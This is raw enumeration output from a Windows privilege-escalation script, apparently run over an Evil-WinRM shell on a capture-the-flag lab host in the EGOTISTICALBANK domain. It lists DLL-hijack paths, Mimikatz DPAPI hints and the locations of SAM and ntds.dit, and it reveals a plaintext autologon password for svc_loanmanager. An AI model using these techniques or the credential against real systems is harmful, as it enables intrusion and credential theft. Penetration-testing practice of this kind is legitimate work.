+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] SERVICE BINARY PERMISSIONS WITH WMIC + ICACLS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
+ERROR:
+Description = Access denied
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] CHECK IF YOU CAN MODIFY ANY SERVICE REGISTRY <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] UNQUOTED SERVICE PATHS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] When the path is not quoted (ex: C:\Program files\soft\new folder\exec.exe) Windows will try to execute first 'C:\Progam.exe', then 'C:\Program Files\soft\new.exe' and fi
+nally 'C:\Program Files\soft\new folder\exec.exe'. Try to create 'C:\Program Files\soft\new.exe'
+[i] The permissions are also checked and filtered using icacls
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [*] DLL HIJACKING in PATHenv variable <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Maybe you can take advantage of modifying/creating some binary in some of the following locations
+[i] PATH variable entries permissions - place binary or DLL to execute instead of legitimate
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dll-hijacking
+C:\Windows\system32 NT SERVICE\TrustedInstaller:(F)
+
+C:\Windows NT SERVICE\TrustedInstaller:(F)
+
+C:\Windows\System32\Wbem NT SERVICE\TrustedInstaller:(F)
+
+C:\Users\FSmith\AppData\Local\Microsoft\WindowsApps NT AUTHORITY\SYSTEM:(OI)(CI)(F)
+                                                    EGOTISTICALBANK\FSmith:(OI)(CI)(F)
+
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [*] CREDENTIALS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] WINDOWS VAULT <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#windows-vault
+
+Currently stored credentials:
+
+* NONE *
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] DPAPI MASTER KEYS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Use the Mimikatz 'dpapi::masterkey' module with appropriate arguments (/rpc) to decrypt
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
+
+
+    Directory: C:\Users\FSmith\AppData\Roaming\Microsoft\Protect
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d---s-        1/24/2020   6:30 AM                S-1-5-21-2966785786-3096785034-1186376766-1105
+
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] DPAPI MASTER KEYS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Use the Mimikatz 'dpapi::cred' module with appropriate /masterkey to decrypt
+[i] You can also extract many DPAPI masterkeys from memory with the Mimikatz 'sekurlsa::dpapi' module
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
+Looking inside C:\Users\FSmith\AppData\Roaming\Microsoft\Credentials\
+Looking inside C:\Users\FSmith\AppData\Local\Microsoft\Credentials\
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] Unattended files <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] SAM
+'SYSTEM' is not recognized as an internal or external command,
+operable program or batch file.
+C:\Windows\System32\config\RegBack\SAM exists.
+C:\Windows\System32\config\SAM exists.
+C:\Windows\System32\config\SYSTEM exists.
+C:\Windows\System32\config\RegBack\SYSTEM exists.
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] McAffe SiteList.xml <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+ Volume in drive C has no label.
+ Volume Serial Number is 489C-D8FC
+File Not Found
+ Volume in drive C has no label.
+ Volume Serial Number is 489C-D8FC
+File Not Found
+ Volume in drive C has no label.
+ Volume Serial Number is 489C-D8FC
+File Not Found
+ Volume in drive C has no label.
+ Volume Serial Number is 489C-D8FC
+File Not Found
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] GPP Password <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+The system cannot find the path specified.
+File Not Found
+The system cannot find the path specified.
+File Not Found
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] Cloud Creds <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+File Not Found
+
+File Not Found
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] AppCmd <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe
+C:\Windows\system32\inetsrv\appcmd.exe exists.
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] Files an registry that may contain credentials <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Searching specific files that may contains credentials.
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
+Looking inside HKCU\Software\ORL\WinVNC3\Password
+Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password
+Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon
+    DefaultDomainName    REG_SZ    EGOTISTICALBANK
+    DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
+    DefaultPassword    REG_SZ    Moneymakestheworldgoround!
+Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ExtensionAgents
+    W3SVC    REG_SZ    Software\Microsoft\W3SVC\CurrentVersion
+
+Looking inside HKCU\Software\TightVNC\Server
+Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions
+Looking inside HKCU\Software\OpenSSH\Agent\Keys
+C:\Windows\Panther\setupinfo
+C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.973.1.6\amd64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.17763.802_none_1e7c6
+0c1f59ab8b2\f\appcmd.exe
+C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.973.1.6\amd64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.17763.802_none_1e7c6
+0c1f59ab8b2\r\appcmd.exe
+C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.973.1.6\wow64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.17763.802_none_28d10
+b1429fb7aad\f\appcmd.exe
+C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.973.1.6\wow64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.17763.802_none_28d10
+b1429fb7aad\r\appcmd.exe
+C:\Windows\System32\ntds.dit
+C:\Windows\System32\config\SAM
+C:\Windows\System32\config\SYSTEM
+C:\Windows\System32\config\RegBack\SAM
+C:\Windows\System32\config\RegBack\SYSTEM
+C:\Windows\System32\inetsrv\appcmd.exe
+C:\Windows\SysWOW64\inetsrv\appcmd.exe
+C:\Windows\WinSxS\amd64_ipamprov-dcnps_31bf3856ad364e35_10.0.17763.1_none_90fd9849ea1e4266\ScheduledTasks.xml
+C:\Windows\WinSxS\amd64_ipamprov-dhcp_31bf3856ad364e35_10.0.17763.1_none_64f02b544b2506ef\ScheduledTasks.xml
+C:\Windows\WinSxS\amd64_ipamprov-dns_31bf3856ad364e35_10.0.17763.1_none_825235baef207c8d\ScheduledTasks.xml
+C:\Windows\WinSxS\amd64_microsoft-windows-d..rvices-domain-files_31bf3856ad364e35_10.0.17763.1_none_8bd0f81f9b897a08\ntds.dit
+C:\Windows\WinSxS\amd64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.17763.1_none_9a517574c8380381\appcmd.exe
+C:\Windows\WinSxS\amd64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.17763.802_none_1e7c60c1f59ab8b2\appcmd.exe
+C:\Windows\WinSxS\amd64_microsoft-windows-webenroll.resources_31bf3856ad364e35_10.0.17763.1_en-us_742f5bf0baaff2c7\certnew.cer
+C:\Windows\WinSxS\wow64_ipamprov-dcnps_31bf3856ad364e35_10.0.17763.1_none_9b52429c1e7f0461\ScheduledTasks.xml
+C:\Windows\WinSxS\wow64_ipamprov-dhcp_31bf3856ad364e35_10.0.17763.1_none_6f44d5a67f85c8ea\ScheduledTasks.xml
+C:\Windows\WinSxS\wow64_ipamprov-dns_31bf3856ad364e35_10.0.17763.1_none_8ca6e00d23813e88\ScheduledTasks.xml
+C:\Windows\WinSxS\wow64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.17763.1_none_a4a61fc6fc98c57c\appcmd.exe
+C:\Windows\WinSxS\wow64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.17763.802_none_28d10b1429fb7aad\appcmd.exe
+File Not Found
+
+
+*Evil-WinRM* PS C:\Users\FSmith\Downloads>
